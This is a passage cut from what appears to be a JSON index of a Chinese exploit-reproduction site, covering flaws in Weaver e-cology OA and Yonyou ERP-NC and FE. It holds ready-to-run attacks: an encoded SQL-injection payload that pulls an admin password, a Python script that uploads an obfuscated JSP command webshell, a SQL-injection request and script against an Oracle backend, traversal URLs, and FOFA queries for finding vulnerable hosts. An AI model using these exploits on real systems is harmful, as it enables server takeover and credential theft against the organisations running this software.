","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC, 将SQL语句进行3次URL编码 asdasdasxx%' union select 1,(select password from HrmResourceManager where id=1) union select 1,'1 /mobile/%20/plugin/browser.jsp?isDis=1\u0026browserTypeId=269\u0026keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%38%25%32%35%25%33%37%25%33%38%25%32%35%25%33%32%25%33%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%38%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%34%25%32%35%25%33%35%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%34%25%36%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%33%38%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA weaver.common.Ctrl 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的路径为 /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp\u0026arg1=validateApp 请求包为 使用POC文件上传 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import zipfile import random import sys import requests def generate_random_str(randomlength=16): random_str = '' base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789' length = len(base_str) - 1 for i in range(randomlength): random_str += base_str[random.randint(0, length)] return random_str mm = generate_random_str(8) webshell_name1 = mm+'.jsp' webshell_name2 = '../../../'+webshell_name1 def file_zip(): shell = \"\"\"\u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c% if(request.getParameter(\"cmd\")!=null){ BASE64Decoder decoder = new BASE64Decoder(); Class rt = Class.forName(new String(decoder.decodeBuffer(\"amF2YS5sYW5nLlJ1bnRpbWU=\"))); Process e = (Process) rt.getMethod(new String(decoder.decodeBuffer(\"ZXhlYw==\")), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(\"Z2V0UnVudGltZQ==\"))).invoke(null, new Object[]{}), request.getParameter(\"cmd\") ); java.io.InputStream in = e.getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\" \u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\u003c/pre\u003e\"); } %\u003e \"\"\" ## 替换shell内容 zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED) zf.writestr(webshell_name2, shell) def GetShell(urllist): file_zip() print('上传文件中') urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp\u0026arg1=validateApp' file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))] requests.post(url=urls,files=file,timeout=60, verify=False) GetShellurl = urllist+'/cloudstore/'+webshell_name1 GetShelllist = requests.get(url = GetShellurl) if GetShelllist.status_code == 200: print('利用成功webshell地址为:'+GetShellurl) else: print('未找到webshell利用失败') def main(): if (len(sys.argv) == 2): url = sys.argv[1] GetShell(url) else: print(\"python3 poc.py http://xx.xx.xx.xx\") if __name__ == '__main__': main() ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 原漏洞公开地址 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:6:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver.common.ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA WorkflowCenterTreeData SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 2019年10月10日CNVD发布了泛微e-cology OA系统存在SQL注入漏洞。该漏洞是由于OA系统的WorkflowCenterTreeData接口中涉及Oracle数据库的SQL语句缺乏安全检查措施所导致的，任意攻击者都可借SQL语句拼接时机注入恶意payload，造成SQL注入攻击。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 使用Oracle数据库的泛微服务 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 泛型微生态OA系统的WorkflowCenterTreeData接口在使用Oracle数据库时，由于内置sql语句分解不严密，导致其存在的sql注入漏洞 漏洞请求包 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1\u0026scope=2333 HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url): target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1\u0026scope=2333' payload=\"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\" res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] exploit(url) ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 泛微OA WorkflowCenterTreeData接口注入复现（仅限oracle数据库） ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-workflowcentertreedata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 ERP-NC NCFindWeb 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友ERP-NC ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"用友-UFIDA-NC\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 POC为 /NCFindWeb?service=IPreAlertConfigService\u0026filename= 查看 ncwslogin.jsp 文件 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-erp-nc-ncfindweb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 FE协作办公平台 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"FE协作\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-fe%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateoftaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 GRP-U8 